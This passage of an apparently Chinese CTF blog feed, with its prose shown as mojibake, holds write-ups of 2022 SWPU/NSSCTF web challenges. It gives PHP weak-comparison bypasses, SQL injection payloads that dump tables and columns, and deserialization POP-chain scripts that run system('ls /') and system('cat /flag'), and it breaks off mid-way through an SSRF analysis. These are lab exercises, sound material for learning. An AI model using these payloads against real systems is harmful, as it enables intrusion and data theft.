æ¼æ´å¤ç°_ADummy_çš„åšå®¢-CSDNåšå®¢</a>)<br>è¿™é‡Œæœ¨é©¬æ˜¯å†™ä¸è¿›å»çš„ï¼Œç›´æ¥æ‰§è¡Œphpinfoç„¶åæœç´¢flag<br><img src="https://s1.ax1x.com/2022/11/19/zucHgI.png" alt="zucHgI.png"><br>æäº¤æ˜¯å‡flagç¦»äº†ä¸ªå¤§è°±ï¼Œç„¶åå›å»catä¸€ä¸‹å‡ºæ¥äº†<br><img src="https://s1.ax1x.com/2022/11/19/zucODf.png" alt="zucODf.png"></p><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>ä¸€å¼€å§‹æ‰¾äº†è¿™ä¸ªWeblogicçš„SSRFæ¼æ´ä½†æ˜¯å†…ç½‘ipä¸€ç›´å¼„ä¸å‡ºæ¥ï¼Œæ¢æ€è·¯å‘ç°å¥½åƒä¸æ˜¯è¿™ä¸ªæ´<br>(<a href="https://blog.csdn.net/yumengzth/article/details/97522783">https://blog.csdn.net/yumengzth/article/details/97522783</a>)<br>å‚è€ƒè¿™ä¸ªï¼Œåˆ©ç”¨å·¥å…·å‡ºæ¥<br><img src="https://s1.ax1x.com/2022/11/19/zucxUg.png" alt="zucxUg.png"></p><p>å¾ˆé—æ†¾æœ€ç»ˆæ²¡èƒ½è¿›å…¥å‰30</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022SWPUæœªè§£é¢˜å¤ç°</title>
      <link href="/2022/11/SWPU%E6%9C%AA%E8%A7%A3%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/11/SWPU%E6%9C%AA%E8%A7%A3%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Funny-web"><a href="#Funny-web" class="headerlink" title="Funny_web"></a>Funny_web</h2><p>è¿™ä¸ªé¢˜ä¸€å¼€å§‹å°±æ²¡åšï¼Œä¸çŸ¥é“è´¦å·å’Œå¯†ç ç®—æ˜¯ä»–ä»¬å†…éƒ¨é¢˜å§</p><p><img src="https://s1.ax1x.com/2022/11/08/xzm2WT.md.png" alt="xzm2WT.md.png"></p><p>ç„¶åè¿›å»ä¹‹åçœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿™ä¸ºä½•ç›¸ç­‰åˆä¸ç›¸ç­‰&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å¡äº†ä¸€ä¸‹ä¸€ç›´åœ¨çº ç»“<code>intval</code>è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œå…¶å®ä¸æ˜¯è€ƒè¿™ä¸ªå‡½æ•°è€Œæ˜¯è€ƒPHPå¼±æ¯”è¾ƒ<br>æ‰€ä»¥payloadï¼š<code>?num=12345a</code><br><img src="https://s1.ax1x.com/2022/11/08/xzmWSU.md.png" alt="xzmWSU.md.png"></p><h2 id="where-am-i"><a href="#where-am-i" class="headerlink" title="where_am_i"></a>where_am_i</h2><p>è¿™ä¸ªé¢˜é‚£å¼ å›¾ç‰‡å®åœ¨æ˜¯æ²¡çœ‹æ¸…é‚£ä¸ªé…’åº—å«å•¥åå­—<br>å±±æ°´é—´å¤è¿¹é…’åº—ç™¾åº¦åœ°å›¾æ‰¾åˆ°<br><img src="https://s1.ax1x.com/2022/11/08/xzmOSO.md.png" alt="xzmOSO.md.png"><br>è¾“å…¥å®¢æœç”µè¯å»æ‰å­—ç¬¦å°±è¡Œ<br><img src="https://s1.ax1x.com/2022/11/08/xzmqfK.md.png" alt="xzmqfK.md.png"></p><h2 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h2><p>å‰é¢æŠ“åŒ…å‘ç°1.jsï¼Œç„¶åæœ‰ä¸ªNsScTf.phpè¿™äº›æ­¥éª¤å…ˆè¿‡å½“æ—¶ä¸æ˜¯å¡åœ¨è¿™é‡Œ<br>è¿›å…¥NsScTf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">//hint: ä¸getç›¸ä¼¼çš„å¦ä¸€ç§è¯·æ±‚åè®®æ˜¯ä»€ä¹ˆå‘¢  </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;  </span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¡åœ¨è¿™é‡Œï¼Œä¸€å¼€å§‹çœ‹é‚£ä¸ªhintä»¥ä¸ºæ˜¯ç”¨HEADè¯·æ±‚ä½†ä¸æ˜¯<br>åˆ©ç”¨<code>call_user_func</code>å‡½æ•°ï¼Œç›´æ¥çœ‹payloadï¼š<code>?p=Nss::Ctf</code>ç”¨å¤§å†™ç»•è¿‡æ­£åˆ™åŒ¹é…æ¨¡å¼æ˜¯mæ‰€ä»¥å¯ä»¥ç”¨å¤§å†™ç»•è¿‡ä¸»è¦æ˜¯è¿™é‡Œå¯ä»¥ç”¨<code>::</code>æ¥è¿›å…¥ctfè¿™ä¸ªå‡½æ•°<br><img src="https://s1.ax1x.com/2022/11/08/xznkp8.md.png" alt="xznkp8.md.png"><br>æç¤ºnss2,åŒæ ·çš„åˆ©ç”¨æ–¹æ³•<br><img src="https://s1.ax1x.com/2022/11/08/xzniff.png" alt="xzniff.png"><br>flagåœ¨æºç </p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>è¿™ä¸ªé¢˜å½“æ—¶æ²¡åšå‡ºæ¥ä¸€å¼€å§‹æ²¡æ‰¾åˆ°ç»•è¿‡æ–¹å¼ï¼Œåé¢æ²¡åšäº†</p><p>ç”¨postä¼ å‚ è¿‡æ»¤äº† <code>or ç©ºæ ¼ union</code><br>çˆ†è¡¨<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xzn31U.png" alt="xzn31U.png"><br>çˆ†åˆ—<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xznGX4.png" alt="xznGX4.png"><br>å­—æ®µ<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(Secr3t,flll444g)/**/from/**/NSS_tb%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xzn8cF.png" alt="xzn8cF.png"></p><h2 id="ez-1zpop"><a href="#ez-1zpop" class="headerlink" title="ez_1zpop"></a>ez_1zpop</h2><p>è¿™ä¸ªpopé“¾åšçš„æ—¶å€™æ²¡çœ‹æ‡‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)  </span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   <span class="title function_ invoke__">highlight_file</span>(__file__);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹finç±»ä¸­çš„fmm()å‡½æ•°ï¼Œ<code>$b($this-&gt;title);</code>è¿™ä¸€æ¡è¯­å¥å¦‚æœbä¸ºsystemè€Œtitleä¸ºls &#x2F;,é‚£ä¹ˆæ˜¯ä¸æ˜¯å°±æ‰§è¡ŒæŸ¥çœ‹æ ¹ç›®å½•ï¼Œæ€ä¹ˆè¿›å…¥è¿™ä¸ªå‡½æ•°å‘¢ï¼Ÿltç±»ä¸­toStringå¯ä»¥è¿›å…¥<code>return $this-&gt;impo-&gt;fmm();</code>é‚£ä¹ˆæ€ä¹ˆè¿›å…¥toStringå‘¢ï¼Œå½“å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºæ—¶ä¼šè¿›å…¥toStringæ–¹æ³•ï¼Œçœ‹__destruct()é”€æ¯å¯¹è±¡æ—¶ä¼šè¾“å‡ºè¿™ä¸ªå¯¹è±¡ï¼Œè‡³æ­¤popé“¾å°±ç†æ¸…æ¥šäº†ï¼Œè¿™é‡Œå°±è¿›å…¥toStringæœ‰ç‚¹éš¾ç†è§£ï¼Œå…¶å®ƒè¿˜å¥½ï¼Œè¿™ä¸ªpopé“¾æ˜¯éœ€è¦è‡ªå·±å»æ„é€ å±é™©å‡½æ•°çš„æ‰§è¡Œï¼Œä»¥å‰æ²¡ç»ƒè¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;impo = <span class="variable">$f</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;  </span><br><span class="line">        <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);<span class="comment">//è¿™é‡Œåšå‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;system&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;title = <span class="string">&quot;ls /&quot;</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lt</span>(<span class="variable">$a</span>);<span class="comment">//é€šè¿‡æ„é€ å‡½æ•°è®©this-&gt;impoä¸ºå¯¹è±¡é”€æ¯æ—¶è¿›å…¥toString  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md51[]=<span class="number">1</span>;<span class="comment">//é€šè¿‡æ•°ç»„ç»•è¿‡MD5  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md52[] = <span class="number">2</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><h2 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h2><p>ä¹‹å‰æ²¡åšè¿‡è¿™ç§åˆ©ç”¨å‚æ•°æ‰§è¡Œå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;  </span><br><span class="line">       </span><br><span class="line">     <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">     </span>&#123;        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;lt;        <span class="variable">$a</span>(<span class="variable language_">$this</span>-&gt;lly);  </span><br><span class="line">     &#125;  </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>]);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;    </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lyh</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;lt=<span class="string">&quot;assert&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;lly=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/11/08/xznbHs.png" alt="xznbHs.png"></p><h2 id="js-sign"><a href="#js-sign" class="headerlink" title="js_sign"></a>js_sign</h2><p>æŸ¥çœ‹æºç <br><img src="https://s1.ax1x.com/2022/11/08/xzuVC6.png" alt="xzuVC6.png"><br>é€šè¿‡tapcodeè§£ç flagå‡ºæ¥ä¸‹é¢è¿™ä¸²å­—ç¬¦ï¼Œä¸çŸ¥é“æ€ä¹ˆæäº¤äº†<br><img src="https://s1.ax1x.com/2022/11/08/xzuA4x.png" alt="xzuA4x.png"></p><h2 id="Power"><a href="#Power" class="headerlink" title="Power!"></a>Power!</h2><p>çœ‹æºç æœ‰æç¤º<br><img src="https://s1.ax1x.com/2022/11/08/xzuTG6.png" alt="xzuTG6.png"><br>å…¨éƒ¨çš„ä»£ç å°±ä¸æ”¾äº†å§æŒºé•¿çš„æ…¢æ…¢åˆ†æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨getæ–¹æ³•ä¼ å…¥<code>image_path=flag.php</code><br><img src="https://s1.ax1x.com/2022/11/08/xzu7RK.png" alt="xzu7RK.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuHxO.png" alt="xzuHxO.png"><br>flagåœ¨å†…ç½‘ï¼ŒSSRFï¼Œçœ‹ä¸€ä¸‹å“ªé‡Œèƒ½åˆ©ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123; <span class="comment">//flag</span></span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>); <span class="comment">//curl_exec() æ‰§è¡ŒcURLä¼šè¯ã€‚</span></span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è¿›è¡ŒSSRFï¼Œè·Ÿä¸€ä¸‹è¿™ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 